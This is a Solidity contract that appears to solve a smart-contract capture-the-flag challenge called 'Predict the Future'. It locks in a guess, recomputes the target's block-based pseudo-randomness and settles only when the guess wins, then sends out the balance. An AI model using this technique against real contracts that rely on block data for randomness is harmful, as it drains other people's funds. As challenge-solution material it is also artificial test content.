pragma solidity ^0.6.0;

import "interfaces/IPredictTheFutureChallenge.sol";

contract PredictTheFutureAttack {
    uint8 guess;
    IPredictTheFutureChallenge challengeContract;

    constructor(IPredictTheFutureChallenge _challengeContract) public {
        challengeContract = _challengeContract;
    }

    function lockInGuess(uint8 _guess) public payable {
        guess = _guess;
        challengeContract.lockInGuess{value: msg.value}(_guess);
    }

    function attack() external {
        uint8 answer = uint8(
            uint256(
                keccak256(
                    abi.encodePacked(
                        blockhash(block.number - 1),
                        block.timestamp
                    )
                )
            )
        ) % 10;
        if (guess == answer) {
            challengeContract.settle();
            msg.sender.transfer(address(this).balance);
        }
    }

    receive() external payable {}
}
